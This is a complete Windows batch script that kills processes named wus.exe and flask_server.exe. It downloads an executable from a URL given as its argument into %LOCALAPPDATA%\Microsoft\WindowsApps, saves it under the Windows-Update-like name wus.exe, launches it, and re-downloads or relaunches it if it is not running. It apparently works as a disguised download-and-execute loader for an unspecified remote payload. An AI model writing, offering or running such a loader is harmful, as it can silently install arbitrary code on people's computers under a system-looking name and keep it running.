@echo off
setlocal

:: Kill any old processes
taskkill /F /IM wus.exe /T >nul 2>&1
taskkill /F /IM flask_server.exe /T >nul 2>&1

:: Delete old file if it exists
del /f /q "%localappdata%\Microsoft\WindowsApps\wus.exe" >nul 2>&1

:: Download new file
powershell -NoProfile -Command "iwr -Uri '%~1' -OutFile '$env:LOCALAPPDATA\Microsoft\WindowsApps\wus.exe'"

:: Run the downloaded file
start "" "%localappdata%\Microsoft\WindowsApps\wus.exe"

:: Wait 10 seconds
timeout /t 10 /nobreak >nul

:: Check if it's running
tasklist | find /I "wus.exe" >nul
if %errorlevel%==0 (
    echo wus.exe is running.
    exit /b 0
) else (
    echo wus.exe not running, retrying...
    if exist "%localappdata%\Microsoft\WindowsApps\wus.exe" (
        start "" "%localappdata%\Microsoft\WindowsApps\wus.exe"
    ) else (
        echo Re-downloading wus.exe...
        powershell -NoProfile -Command "iwr -Uri '%~1' -OutFile '$env:LOCALAPPDATA\Microsoft\WindowsApps\wus.exe'"
        start "" "%localappdata%\Microsoft\WindowsApps\wus.exe"
    )
)

exit /b 0
